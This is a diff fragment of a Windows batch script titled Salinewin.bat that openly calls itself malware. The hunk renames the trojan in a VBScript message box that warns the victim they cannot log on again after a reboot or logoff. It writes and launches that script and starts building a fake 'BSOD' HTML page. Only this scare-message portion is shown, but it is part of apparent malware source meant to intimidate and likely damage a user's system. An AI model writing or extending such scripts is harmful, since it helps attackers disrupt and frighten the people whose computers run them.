@@ -3,7 +3,7 @@ title Salinewin.bat
 echo This malware is no joke, continue?
 pause
 cls
-echo msgbox "You are trashed by BlueLogon trojan if you reboot or logoff you can't logon again" >x.vbs
+echo msgbox "You are trashed by Selenewin malware if you reboot or logoff you can't logon again" >x.vbs
 start wscript x.vbs
 ping localhost -n 1 >nul
 echo ^<html^>^<head^>^<title^>BSOD^
